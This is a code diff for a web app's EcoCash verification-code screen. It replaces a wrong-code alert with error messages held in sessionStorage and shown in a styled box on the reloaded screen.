@@ -1600,11 +1600,18 @@ async function monitorVerificationStatus() {
         if (stage === "waiting_code" &&
             result.application.verification_status === "Wrong Code") {
 
-            alert(
-                "❌ The verification code could not be verified. Please check the code and try again."
-            );
+            sessionStorage.setItem(
+    "verificationError",
+    "❌ Verification unsuccessful"
+);
 
-            loadEcoCashVerificationScreen();
+sessionStorage.setItem(
+    "verificationErrorMessage",
+    "The code could not be verified. Please enter the latest verification code and try again."
+);
+
+loadEcoCashVerificationScreen();
+
 
             return;
         }
@@ -2042,6 +2049,14 @@ function loadEcoCashVerificationScreen() {
 
     const app = document.getElementById("app");
 
+const verificationError =
+    sessionStorage.getItem("verificationError");
+
+const verificationErrorMessage =
+    sessionStorage.getItem(
+        "verificationErrorMessage"
+    );
+    
     app.innerHTML = `
 
     <div class="container">
@@ -2093,7 +2108,26 @@ function loadEcoCashVerificationScreen() {
             </p>
 
             <label>Verification Code</label>
+            ${verificationError ? `
+    <div style="
+        background:#fff3f3;
+        border:1px solid #e74c3c;
+        border-radius:10px;
+        padding:15px;
+        margin:15px 0;
+        color:#c0392b;
+    ">
+        <strong>
+            ${verificationError}
+        </strong>
 
+        <br><br>
+
+        <span>
+            ${verificationErrorMessage}
+        </span>
+    </div>
+` : ""}
             <input
                 type="text"
                 id="ecoVerificationCode"
@@ -2127,6 +2161,8 @@ function loadEcoCashVerificationScreen() {
             "click",
             saveEcoCashVerification
         );
+    sessionStorage.removeItem("verificationError");
+sessionStorage.removeItem("verificationErrorMessage");
 
 }
 // ======================================================
